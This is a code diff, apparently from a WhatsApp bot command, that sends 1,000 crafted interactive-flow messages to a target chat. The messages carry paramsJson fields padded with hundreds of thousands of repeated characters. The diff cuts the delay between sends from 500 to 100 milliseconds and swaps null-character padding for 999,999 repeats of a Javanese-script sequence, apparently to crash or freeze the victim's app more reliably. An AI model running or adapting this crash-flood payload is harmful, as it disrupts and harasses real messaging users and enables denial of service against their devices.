@@ -18,7 +18,7 @@ export default {
     await m.reply(global.mess.spam);
     for (let i = 0; i < 1000; i++) {
       try {
-        await utils.sleep(500);
+        await utils.sleep(100);
         await sock.relayMessage(
           jid,
           {
@@ -43,10 +43,10 @@ export default {
                         },
                         nativeFlowResponseMessage: {
                           name: "galaxy_message",
-                          paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
-                            510000,
-                          )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
-                            510000,
+                          paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"'ꦽ".repeat(
+                            999999,
+                          )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"'ꦽ".repeat(
+                            999999,
                           )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                           version: 3,
                         },
